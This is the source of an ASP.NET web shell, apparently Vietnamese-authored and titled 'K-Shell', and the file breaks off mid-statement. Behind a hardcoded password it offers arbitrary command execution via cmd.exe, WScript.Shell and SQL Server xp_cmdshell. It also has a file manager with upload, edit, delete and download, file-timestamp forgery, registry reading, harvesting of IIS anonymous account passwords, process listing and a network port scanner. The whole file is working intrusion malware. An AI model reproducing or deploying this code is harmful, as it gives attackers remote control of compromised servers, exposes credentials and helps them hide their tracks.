<%@ Page ContentType="text/html" validateRequest="false" aspcompat="true"%>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ import namespace="System.Threading" %>
<%@ import namespace="System.Text" %>
<%@ import namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Net.Sockets"%>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>
<%@ import Namespace="Microsoft.Win32" %>

<script language="VB" runat="server">
Dim PASSWORD as string = "123456@@"   'Hash MD5 of password


dim url,TEMP1,TEMP2,TITLE as string
Function GetMD5(ByVal strPlain As String) As String
 	Dim UE As UnicodeEncoding = New UnicodeEncoding
 	Dim HashValue As Byte()
 	Dim MessageBytes As Byte() = UE.GetBytes(strPlain)
 	Dim md5 As MD5 = New MD5CryptoServiceProvider
 	Dim strHex As String = ""
 	HashValue = md5.ComputeHash(MessageBytes)
	 For Each b As Byte In HashValue
   	strHex += String.Format("{0:x2}", b)
 	Next
 	Return strHex
End Function
Sub Login_click(sender As Object, E As EventArgs)
	if Textbox.Text=PASSWORD then     
		session("kogsand")=1
		session.Timeout=60
	else
		response.Write("<font color='red'>M&#7853;t kh&#7849;u &#273;&#225;nh sai r&#7891;i k&#236;a! C&#243; th&#7875; b&#7841;n &#273;&#225;nh sai ho&#7863;c l&#224; &#273;ang b&#7853;t ""Caps Lock"". T&#7855;t &#273;i v&#224; th&#7917; l&#7841;i xem.</font><br>")
	end if
End Sub
'Run w32 shell
Declare Function WinExec Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long)  As Long

Sub RunCmdW32(Src As Object, E As EventArgs)
	dim command
	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")		
	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )
	If Request.Form("txtCommand1") = "" Then
		command = "dir c:\"	
	else 
		command = Request.Form("txtCommand1")
	End If	
	ExecuteCommand1(command,tempFile,txtCmdFile.Text)
	OutputTempFile1(tempFile,fileObject)
	'txtCommand1.text=""
End Sub
Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)
	Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd
	Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name
	Dim FailIfExists
	
	local_dir = left(request.servervariables("PATH_TRANSLATED"),inStrRev(request.servervariables("PATH_TRANSLATED"),"\"))
	'local_copy_of_cmd = Local_dir+"cmd.exe"
	'local_copy_of_cmd= "C:\\WINDOWS\\system32\\cmd.exe"
	local_copy_of_cmd=cmdfile
	Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp")+"\kiss.exe"
	CopyFile(local_copy_of_cmd, Target_copy_of_cmd,FailIfExists)
	errReturn = WinExec(Target_copy_of_cmd + " /c " + command + "  > " + tempFile , 10)
	response.write(errReturn)
	thread.sleep(500)
End Sub
Sub OutputTempFile1(tempFile,oFileSys)
	On Error Resume Next 
	dim oFile = oFileSys.OpenTextFile (tempFile, 1, False, 0)
	resultcmdw32.text=txtCommand1.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
   	oFile.Close
   	Call oFileSys.DeleteFile(tempFile, True)	 
End sub
'End w32 shell
'Run WSH shell
Sub RunCmdWSH(Src As Object, E As EventArgs)
	dim command
	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")
	dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )
	If Request.Form("txtcommand2") = "" Then
		command = "dir c:\"	
	else 
		command = Request.Form("txtcommand2")
	End If	  
	ExecuteCommand2(command,tempFile)
	OutputTempFile2(tempFile,fileObject)
	txtCommand2.text=""
End Sub
Function ExecuteCommand2(cmd_to_execute, tempFile)
	  Dim oScript
	  oScript = Server.CreateObject("WSCRIPT.SHELL")
      Call oScript.Run ("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)
End function
Sub OutputTempFile2(tempFile,fileObject)
    On Error Resume Next
	dim oFile = fileObject.OpenTextFile (tempFile, 1, False, 0)
	resultcmdwsh.text=txtCommand2.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
	oFile.Close
	Call fileObject.DeleteFile(tempFile, True)
End sub
'End WSH shell

'System infor
Sub output_all_environment_variables(mode)
   	Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
   	Dim de As DictionaryEntry
	For Each de In  environmentVariables
	if mode="HTML" then
	response.write("<b> " +de.Key + " </b>: " + de.Value + "<br>")
	else
	if mode="text"
	response.write(de.Key + ": " + de.Value + vbnewline+ vbnewline)
	end if		
	end if
   	Next
End sub
Sub output_all_Server_variables(mode)
    dim item
    for each item in request.servervariables
	if mode="HTML" then
	response.write("<b>" + item + "</b> : ")
	response.write(request.servervariables(item))
	response.write("<br>")
	else
		if mode="text"
			response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)
		end if		
	end if
    next
End sub
'End sysinfor
Function Server_variables() As String
	dim item
	dim tmp As String
	tmp=""
    for each item in request.ServerVariables
    	if request.servervariables(item) <> ""
    	'response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)
    	tmp =+ item.ToString + " : " + request.servervariables(item).ToString + "\n\r"
    	end if
    next
    return tmp
End function
'Begin List processes
Function output_wmi_function_data(Wmi_Function,Fields_to_Show)
		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
		dim fields_split, fields_item,i

		'on error resume next

		table("0","","")
		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)

		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
		
		fields_split = split(Fields_to_Show,",")
		for each item in objProcessInfo	
			tr
				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
				if Ubound(Fields_split)>0 then
					for i = 1 to ubound(fields_split)
						Surround_by_TD(center_(item.properties_.item(fields_split(i)).value))				
					next
				end if
			_tr
		next
End function
Function output_wmi_function_data_instances(Wmi_Function,Fields_to_Show,MaxCount)
		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain
		dim fields_split, fields_item,i,count
		newline
		rw("Hiện tại đang hiện ra " + cstr(MaxCount) + " dòng")
		newline
		newline
		table("1","","")
		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)
		_table
		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
'		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					
		objProcessInfo = winObj.InstancesOf(Wmi_Function)					
		
		fields_split = split(Fields_to_Show,",")
		count = 0
		for each item in objProcessInfo		
			count = Count + 1
			table("1","","")
			tr
				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)
				if Ubound(Fields_split)>0 then
					for i = 1 to ubound(fields_split)
						Surround_by_TD(item.properties_.item(fields_split(i)).value)				
					next
				end if
			_tr
			if count > MaxCount then exit for
		next
End function
'End List processes
'Begin IIS_list_Anon_Name_Pass
Sub IIS_list_Anon_Name_Pass()
		Dim IIsComputerObj, iFlags ,providerObj ,nodeObj ,item, IP
		
		IIsComputerObj = CreateObject("WbemScripting.SWbemLocator") 			' Create an instance of the IIsComputer object
		providerObj = IIsComputerObj.ConnectServer("127.0.0.1", "root/microsoftIISv2")
		nodeObj  = providerObj.InstancesOf("IIsWebVirtualDirSetting") '  - IISwebServerSetting
		
		Dim MaxCount = 20,Count = 0
		hr
		RW("only showing the first "+cstr(MaxCount) + " items")
		hr
		for each item in nodeObj
			response.write("<b>" + item.AppFriendlyName + " </b> -  ")
			response.write("(" + item.AppPoolId + ") ")
		
			response.write(item.AnonymousUserName + " : ")
			response.write(item.AnonymousUserPass)
			
			response.write("<br>")
			
			response.flush
			Count = Count +1
			If Count > MaxCount then exit for
		next		
		hr
End sub	
'End IIS_list_Anon_Name_Pass
Private Function CheckIsNumber(ByVal sSrc As String) As Boolean
	Dim reg As New System.Text.RegularExpressions.Regex("^0|[0-9]*[1-9][0-9]*$")
      If reg.IsMatch(sSrc) Then
            Return True
      Else
            Return False
      End If
End Function

Public Function IISSpy() As String
      Dim iisinfo As String = ""
      Dim iisstart As String = ""
      Dim iisend As String = ""
      Dim iisstr As String = "IIS://localhost/W3SVC"
      Dim i As Integer = 0
      Try
            Dim mydir As New DirectoryEntry(iisstr)
            iisstart = "<TABLE width=100% align=center border=0><TR align=center><TD width=5%><B>Order</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=20%><B>App_Pool_Id</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>"
            For Each child As DirectoryEntry In mydir.Children
                  If CheckIsNumber(child.Name.ToString()) Then
                        Dim dirstr As String = child.Name.ToString()
                        Dim tmpstr As String = ""
                        Dim newdir As New DirectoryEntry(iisstr + "/" + dirstr)
                        Dim newdir1 As DirectoryEntry = newdir.Children.Find("root", "IIsWebVirtualDir")
						i = i + 1
                        iisinfo += "<TR><TD align=center>" + i.ToString() + "</TD>"
                        iisinfo += "<TD align=center>" + newdir1.Properties("AnonymousUserName").Value.ToString() + "</TD>"
                        iisinfo += "<TD align=center>" + newdir1.Properties("AppPoolId").Value.ToString() + "</TD>"
                        iisinfo += "<TD>" + child.Properties("ServerBindings")(0) + "</TD>"
                        iisinfo += "<TD><a href="+Request.ServerVariables("PATH_INFO")+ "?action=goto&src=" + newdir1.Properties("Path").Value.ToString() + "\>" + newdir1.Properties("Path").Value + "\</a></TD>"
                        iisinfo += "</TR>"
                  End If
            Next
            iisend = "</TABLE>"
      Catch ex As Exception
            Return ex.Message
      End Try
      Return iisstart + iisinfo + iisend
End Function

Sub RegistryRead(Src As Object, E As EventArgs)
	Try
            Dim regkey As String = txtRegKey.Text
            Dim subkey As String = regkey.Substring(regkey.IndexOf("\") + 1, regkey.Length - regkey.IndexOf("\") - 1)
            Dim rk As RegistryKey = Nothing
            Dim buffer As Object
            Dim regstr As String = ""
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_LOCAL_MACHINE" Then
                  rk = Registry.LocalMachine.OpenSubKey(subkey)
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CLASSES_ROOT" Then
                  rk = Registry.ClassesRoot.OpenSubKey(subkey)
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_USER" Then
                  rk = Registry.CurrentUser.OpenSubKey(subkey)
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_USERS" Then
                  rk = Registry.Users.OpenSubKey(subkey)
            End If
            If regkey.Substring(0, regkey.IndexOf("\")) = "HKEY_CURRENT_CONFIG" Then
                  rk = Registry.CurrentConfig.OpenSubKey(subkey)
            End If
            buffer = rk.GetValue(txtRegValue.Text, "NULL")
		dim tmpbyte As Byte = 0
                  lblresultReg.Text = "<br>Result : " + buffer.ToString()
      Catch ex As Exception
            Response.write(ex.Message)
      End Try
End Sub

' Begin List Web Site Home Directory Properties


' End List Web Site Home Directory Properties
Sub RunCMD(Src As Object, E As EventArgs)
	Try
	Dim kProcess As New Process()
	Dim kProcessStartInfo As New ProcessStartInfo("cmd.exe")
	kProcessStartInfo.UseShellExecute = False
	kProcessStartInfo.RedirectStandardOutput = true
	kProcess.StartInfo = kProcessStartInfo
	kProcessStartInfo.Arguments="/c " & Cmd.text
	kProcess.Start()
	Dim myStreamReader As StreamReader = kProcess.StandardOutput
	Dim myString As String = myStreamReader.Readtoend()
	kProcess.Close()
	result.text=Cmd.text & vbcrlf & "<pre>" & mystring & "</pre>"
	Cmd.text=""
	Catch
	result.text="Chức năng này đã bị tắt rồi!"
	End Try
End Sub
Sub CloneTime(Src As Object, E As EventArgs)
	existdir(time1.Text)
	existdir(time2.Text)
	Dim thisfile As FileInfo =New FileInfo(time1.Text)
	Dim thatfile As FileInfo =New FileInfo(time2.Text)
	thisfile.LastWriteTime = thatfile.LastWriteTime
	thisfile.LastAccessTime = thatfile.LastAccessTime
	thisfile.CreationTime = thatfile.CreationTime
	response.Write("<font color=""red"">Giả mạo thời gian thành công</font>")
End Sub
sub Editor(Src As Object, E As EventArgs)
	dim mywrite as new streamwriter(filepath.text,false,encoding.default)
	mywrite.write(content.text)
	mywrite.close
	response.Write("<script>alert('Edit|Creat " & replace(filepath.text,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(filepath.text)) &"'</sc" & "ript>")
end sub

Protected Sub UploadFile(sender As Object, e As EventArgs)

	dim filename,loadpath as string
	filename=path.getfilename(FileUploadPortal.FileName)
	loadpath=TextBoxSaveUpUrl.Text & filename
	response.Write("<script>alert("& loadpath &")</sc" & "ript>")
	if  file.exists(loadpath)=true then 
		response.Write("<script>alert('Lỗi File " & filename & " đã tồn tại');location.href='" &  request.ServerVariables("URL") & "?action=goto&src=" & server.UrlEncode(TextBoxSaveUpUrl.Text) & "' </sc" & "ript>")
		response.End()
	end if

	FileUploadPortal.SaveAs(loadpath)

    lblMessagePortal.Text = Path.GetFileName(FileUploadPortal.FileName) + " Đã được upload."
End Sub
Sub NewFD(Src As Object, E As EventArgs)
	url=request.form("src")
	if NewFile.Checked = True then
		dim mywrite as new streamwriter(url & NewName.Text,false,encoding.default)
		mywrite.close
		response.Redirect(request.ServerVariables("URL") & "?action=edit&src=" & server.UrlEncode(url & NewName.Text))
	else
		directory.createdirectory(url & NewName.Text)
		response.Write("<script>alert('Creat directory " & replace(url & NewName.Text ,"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</sc" & "ript>")
	end if
End Sub
Sub del(a)
	if right(a,1)="\" then
		dim xdir as directoryinfo
		dim mydir as new DirectoryInfo(a)
		dim xfile as fileinfo
		for each xfile in mydir.getfiles()
			file.delete(a & xfile.name)
		next
		for each xdir in mydir.getdirectories()
			call del(a & xdir.name & "\")
		next
		directory.delete(a)
	else
		file.delete(a)
	end if
End Sub
Sub copydir(a,b)
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo(a)
	dim xfile as fileinfo
	for each xfile in mydir.getfiles()
		file.copy(a & "\" & xfile.name,b & xfile.name)
	next
	for each xdir in mydir.getdirectories()
		directory.createdirectory(b & path.getfilename(a & xdir.name))
		call copydir(a & xdir.name & "\",b & xdir.name & "\")
	next
End Sub
Sub xexistdir(temp,ow)
	if directory.exists(temp)=true or file.exists(temp)=true then 
		if ow=0  then
			response.Redirect(request.ServerVariables("URL") & "?action=samename&src=" & server.UrlEncode(url))
		elseif ow=1 then
			del(temp)
		else
			dim d as string = session("cutboard")
			if right(d,1)="\" then
				TEMP1=url & second(now) & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			else
				TEMP2=url & second(now) & replace(path.getfilename(d),"","")
			end if
		end if
	end if
End Sub
Sub existdir(temp)
		if  file.exists(temp)=false and directory.exists(temp)=false then 
			response.Write("<script>alert('Don\'t exist " & replace(temp,"\","\\")  &" ! Is it a CD-ROM ?');</sc" & "ript>")
			response.Write("<br><br><a href='javascript:history.back(1);'>Ấn vào đây để trở lại</a>")
			response.End()
		end if
End Sub
Sub RunSQLCMD(Src As Object, E As EventArgs)
	Dim adoConn,strQuery,recResult,strResult
	if SqlName.Text<>"" then
		adoConn=Server.CreateObject("ADODB.Connection") 
		adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text) 
		If Sqlcmd.Text<>"" Then 
			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'" 
	  		recResult = adoConn.Execute(strQuery) 
 	 		If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			recResult = Nothing 
  			strResult = Replace(strResult," ","&nbsp;") 
  			strResult = Replace(strResult,"<","&lt;") 
  			strResult = Replace(strResult,">","&gt;") 
			resultSQL.Text=SqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
			SqlCMD.Text=""
		 End if 
  		adoConn.Close 
	 End if
 End Sub
Sub RunSQLQUERY(Src As Object, E As EventArgs)
	Dim adoConn,strQuery,recResult,strResult
	if txtSqlName.Text<>"" then
		adoConn=Server.CreateObject("ADODB.Connection") 
		adoConn.Open("Provider=SQLOLEDB.1;Password=" & txtSqlPass.Text & ";UID=" & txtSqlName.Text & ";Data Source = " & txtHost.Text) 
		If txtSqlcmd.Text<>"" Then 
			strQuery = txtSqlcmd.Text
	  		recResult = adoConn.Execute(strQuery) 
 	 		If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			recResult = Nothing 
  			strResult = Replace(strResult," ","&nbsp;") 
  			strResult = Replace(strResult,"<","&lt;") 
  			strResult = Replace(strResult,">","&gt;") 
			lblresultSQL.Text=txtSqlCMD.Text & vbcrlf & "<pre>" & strResult & "</pre>"
			txtSqlCMD.Text=""
		 End if 
  		adoConn.Close 
	 End if
 End Sub

Function GetStartedTime(ms) 
	GetStartedTime=cint(ms/(1000*60*60))
End function
Function getIP() 
    Dim strIPAddr as string
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
    Else
        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    getIP = Trim(Mid(strIPAddr, 1, 30))
End Function
Function Getparentdir(nowdir)
	dim temp,k as integer
	temp=1
	k=0
	if len(nowdir)>4 then 
		nowdir=left(nowdir,len(nowdir)-1) 
	end if
	do while temp<>0
		k=temp+1
		temp=instr(temp,nowdir,"\")
		if temp =0 then
			exit do
		end if
		temp = temp+1
	loop
	if k<>2 then
		getparentdir=mid(nowdir,1,k-2)
	else
		getparentdir=nowdir
	end if
End function
Function Rename()
	url=request.QueryString("src")
	if file.exists(Getparentdir(url) & request.Form("name")) then
		rename=0   
	else
		file.copy(url,Getparentdir(url) & request.Form("name"))
		del(url)
		rename=1
	end if
End Function 
Function GetSize(temp)
	if temp < 1024 then
		GetSize=temp & " B"
	else
		if temp\1024 < 1024 then
			GetSize=temp\1024 & " KB"
		else
			if temp\1024\1024 < 1024 then
				GetSize=temp\1024\1024 & " MB"
			else
				GetSize=temp\1024\1024\1024 & " GB"
			end if
		end if
	end if
End Function 
Sub downTheFile(thePath)
		dim stream
		stream=server.createObject("adodb.stream")
		stream.open
		stream.type=1
		stream.loadFromFile(thePath)
		response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
		response.addHeader("Content-Length",stream.Size)
		response.charset="UTF-8"
		response.contentType="application/octet-stream"
		response.binaryWrite(stream.read)
		response.flush
		stream.close
		stream=nothing
		response.End()
End Sub
'H T M L  S N I P P E T S
public sub Newline
		response.write("<BR>")
	end sub
	
	public sub TextNewline
		response.write(vbnewline)
	end sub

	public sub rw(text_to_print)	  ' Response.write
		response.write(text_to_print)
	end sub

	public sub rw_b(text_to_print)
		rw("<b>"+text_to_print+"</b>")
	end sub

	public sub hr()
		rw("<hr>")
	end sub

	public sub ul()
		rw("<ul>")
	end sub

	public sub _ul()
		rw("</ul>")
	end sub

	public sub table(border_size,width,height)
		rw("<table border='"+cstr(border_size)+"' width ='"+cstr(width)+"' height='"+cstr(height)+"'>")
	end sub

	public sub _table()
		rw("</table>")
	end sub

	public sub tr()
		rw("<tr>")
	end sub

	public sub _tr()
		rw("</tr>")
	end sub

	public sub td()
		rw("<td>")
	end sub

	public sub _td()
		rw("</td>")
	end sub

	public sub td_span(align,name,contents)
		rw("<td align="+align+"><span id='"+name+"'>"+ contents + "</span></td>")
	end sub

	Public sub td_link(align,title,link,target)
		rw("<td align="+align+"><a href='"+link+"' target='"+target+"'>"+title+"</a></td>")
	end sub

	Public sub link(title,link,target)
		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
	end sub

	Public sub link_hr(title,link,target)
		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
		hr
	end sub

	Public sub link_newline(title,link,target)
		rw("<a href='"+link+"' target='"+target+"'>"+title+"</a>")
		newline
	end sub
	
	public sub empty_Cell(ColSpan)
		rw("<td colspan='"+cstr(colspan)+"'></td>")
	end sub

	public sub empty_row(ColSpan)
		rw("<tr><td colspan='"+cstr(colspan)+"'></td></tr>")
	end sub

       	Public sub Create_table_row_with_supplied_colors(bgColor, fontColor, alignValue, rowItems)
            dim rowItem

            rowItems = split(rowItems,",")
            response.write("<tr bgcolor="+bgcolor+">")
            for each rowItem in RowItems
                response.write("<td align="+alignValue+"><font color="+fontColor+"><b>"+rowItem +"<b></font></td>")
            next
            response.write("</tr>")

        end sub

        Public sub TR_TD(cellContents)
            response.write("<td>")
            response.write(cellContents)
            response.write("</td>")
        end sub
	

        Public sub Surround_by_TD(cellContents)
            response.write("<td>")
            response.write(cellContents)
            response.write("</td>")
        end sub

        Public sub Surround_by_TD_and_Bold(cellContents)
            response.write("<td><b>")
            response.write(cellContents)
            response.write("</b></td>")
        end sub

        Public sub Surround_by_TD_with_supplied_colors_and_bold(bgColor, fontColor, alignValue, cellContents)
            response.write("<td align="+alignValue+" bgcolor="+bgcolor+" ><font color="+fontColor+"><b>")
            response.write(cellContents)
            response.write("</b></font></td>")
        end sub
	Public sub Create_background_Div_table(title,main_cell_contents,top,left,width,height,z_index)
		response.write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'>")
		response.write("  <table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse' bordercolor='#111111' width='100%' id='AutoNumber1' height='100%'>")
		response.write("    <tr heigth=20>")
		response.write("      <td bgcolor='black' align=center><font color='white'><b>"+ title +"</b></font></td>")
		response.write("    </tr>")
		response.write("    <tr>")
		response.write("      <td>"+main_Cell_contents+"</td>")
		response.write("    </tr>")
		response.write("  </table>")
		response.write("</div>")
	end sub

	Public sub Create_Div_open(top,left,width,height,z_index)
		response.write("<div style='position: absolute; top: " + top + "; left: " + left + "; width: "+width+"; height: "+height+"; z-index: "+z_index+"'>")
	end sub


	Public sub Create_Div_close()
		response.write("</div>")
	end sub

	public sub Create_Iframe(left, top, width, height, name,src)
		rw("<span style='position: absolute; left: " + left+ "; top: " +top + "'>")  
		rw("	<iframe name='" + name+ "' src='" + src+ "' width='" + cstr(width) + "' height='" + cstr(height) + "'></iframe>")
    		rw("</span>")
	end sub

	public sub Create_Iframe_relative(width, height, name,src)
		rw("	<iframe name='" + name+ "' src='" + src+ "' width='" + cstr(width) + "' height='" + cstr(height) + "'></iframe>")
	end sub

	public sub return_100_percent_table()
		rw("<table border width='100%' height='100%'><tr><td>sdf</td></tr></table>")
	end sub

	public sub font_size(size)
		rw("<font size="+size+">")
	end sub

	public sub end_font()
		rw("</font>")
	end sub

	public sub red(contents)
		rw("<font color=red>"+contents+"</font>")
	end sub

	public sub yellow(contents)
		rw("<font color='#FF8800'>"+contents+"</font>")
	end sub

	public sub green(contents)
		rw("<font color=green>"+contents+"</font>")
	end sub
	public sub print_var(var_name, var_value,var_description)
		if var_description<> "" Then
			rw(b_(var_name)+" : " + var_value + i_("  ("+var_description+")"))
		else
			rw(b_(var_name)+" : " + var_value)
		end if
		newline
	end sub

' Functions

	public function br_()
		br_ = "<br>"
	end function

	public function b_(contents)
		b_ = "<b>"+ contents + "</b>"
	end function

	public function i_(contents)
		i_ = "<i>"+ contents + "</i>"
	end function

	public function li_(contents)
		li_ = "<li>"+ contents + "</li>"
	end function

	public function h1_(contents)
		h1_ = "<h1>"+ contents + "</h1>"
	end function

	public function h2_(contents)
		h2_ = "<h2>"+ contents + "</h2>"
	end function

	public function h3_(contents)
		h3_ = "<h3>"+ contents + "</h3>"
	end function

	public function big_(contents)
		big_ = "<big>"+ contents + "</big>"
	end function

	public function center_(contents)
		center_ = "<center>"+ cstr(contents) + "</center>"
	end function


	public function td_force_width_(width)
		td_force_width_ = "<br><img src='' height=0 width=" + cstr(width) +  " border=0>"
	end function


	public function red_(contents)
		red_ = "<font color=red>"+contents+"</font>"
	end function

	public function yellow_(contents)
		yellow_ = "<font color='#FF8800'>"+contents+"</font>"
	end function

	public function green_(contents)
		green_ = "<font color=green>"+contents+"</font>"
	end function

	Public function link_(title,link,target)
		link_ = "<a href='"+link+"' target='"+target+"'>"+title+"</a>"
	end function
'End HTML SNIPPETS	

'Begin Scanner
Public Class Scanner
Public Ips As New ArrayList()
Public ports As New ArrayList()
Public succMsg As New StringBuilder()
Public ret As ListBox
Public errMsg As String = ""
Public Timeout As Integer = 3000
Public Sub start()
Dim thread As New Thread(New ThreadStart(AddressOf Me.run))
thread.Start()
thread = Nothing
End Sub

Public Sub run()
ret.Items.Clear()
For Each ip As String In Ips
For Each port As String In ports
'ret.Items.Add(ip + ":" + port);
Dim scanres As String = ""
Try
Dim tcpClient As New TcpClient()
Try
            tcpClient.Connect(ip, Int32.Parse(port))
            tcpClient.Close()
            ret.Items.Add(ip + " : " + port + " ................................. Mở")
      Catch e As SocketException
            ret.Items.Add(ip + " : " + port + " ................................. Đóng")
End Try
tcpClient.Close()
Catch exp As SocketException
errMsg = "ErrorCode : " + exp.ErrorCode.ToString() + " : " + exp.Message
End Try
Next
Next
End Sub
End Class

Public Function MakeIps(ByVal StartIp As String, ByVal EndIP As String) As ArrayList
Dim IpList As New ArrayList()
Dim IpParts1 As String() = New String(3) {}
Dim IpParts2 As String() = New String(3) {}
IpParts1 = StartIp.Split("."C)
IpParts2 = EndIP.Split("."C)
Dim nTime As Integer = (Int32.Parse(IpParts2(0)) - Int32.Parse(IpParts1(0))) * 254 * 254 * 254 + (Int32.Parse(IpParts2(1)) - Int32.Parse(IpParts1(1))) * 254 * 254 + (Int32.Parse(IpParts2(2)) - Int32.Parse(IpParts1(2))) * 254 + (Int32.Parse(IpParts2(3)) - Int32.Parse(IpParts1(3))) + 1
If nTime < 0 Then
Response.Write("IP Address Error.Check" & Chr(13) & "" & Chr(10) & "")
Return Nothing
End If
For n As Integer = 0 To nTime - 1
IpList.Add(IpParts1(0) + "." + IpParts1(1) + "." + IpParts1(2) + "." + IpParts1(3))
Dim tmp As Integer = Int32.Parse(IpParts1(3)) + 1
IpParts1(3) = tmp.ToString()
If IpParts1(3).Equals("255") Then
tmp = Int32.Parse(IpParts1(2)) + 1
IpParts1(2) = tmp.ToString()
IpParts1(3) = "1"
End If
If IpParts1(2).Equals("255") Then
tmp = Int32.Parse(IpParts1(1)) + 1
IpParts1(1) = tmp.ToString()
IpParts1(2) = "1"
End If
If IpParts1(1).Equals("255") Then
tmp = Int32.Parse(IpParts1(0)) + 1
IpParts1(0) = tmp.ToString()
IpParts1(1) = "1"

End If
Next
Return IpList
End Function


Protected Sub btnScan_Click(ByVal sender As Object, ByVal e As EventArgs)
If txtStartIP.Text = "" OrElse txtEndIP.Text = "" OrElse txtPorts.Text = "" Then
Response.Write("IP OR Ports Error.Check")
Return
End If
Dim StartIp As String = txtStartIP.Text
Dim EndIp As String = txtEndIP.Text
Dim ips As ArrayList = MakeIps(StartIp, EndIp)
Dim ScanPorts As New ArrayList()
Dim ports As String() = txtPorts.Text.Split(","C)
For Each port As String In ports
'Response.Write(port);
ScanPorts.Add(port)
Next
lstRet.Visible = True
Label1.Visible = True
Dim myscanner As New Scanner()
myscanner.Ips = ips
myscanner.ports = ScanPorts
myscanner.ret = Me.lstRet
myscanner.run()
End Sub

Protected Sub btnReset_Click(ByVal sender As Object, ByVal e As EventArgs)
txtStartIP.Text = ""
txtEndIP.Text = ""
txtPorts.Text = ""
Label1.Visible = False
lstRet.Visible = False
End Sub
'End Scanner
</script>

<%
if request.QueryString("action")="down" and session("kogsand")=1 then
		downTheFile(request.QueryString("src"))
		response.End()
end if
Dim act as string = request.QueryString("action")
if act="cmd" then 
TITLE="CMD.NET"
elseif act="cmdw32" then 
TITLE="ASP.NET W32 Shell"
elseif act="cmdwsh" then 
TITLE="ASP.NET WSH Shell"
elseif act="sqlrootkit" then 
TITLE="SqlRootKit.NET"
elseif act="clonetime" then 
TITLE="Làm giả thời gian"
elseif act="information" then 
TITLE="Th&#244;ng tin m&#225;y ch&#7911;"
elseif act="goto" then 
TITLE="K-Shell"
elseif act="pro1" then 
TITLE="Danh s&#225;ch c&#225;c ch&#432;&#417;ng tr&#236;nh &#273;ang ch&#7841;y tr&#234;n m&#225;y ch&#7911;"
elseif act="pro2" then 
TITLE="List processes from server"
elseif act="user" then 
TITLE="List User Accounts"
elseif act="applog" then 
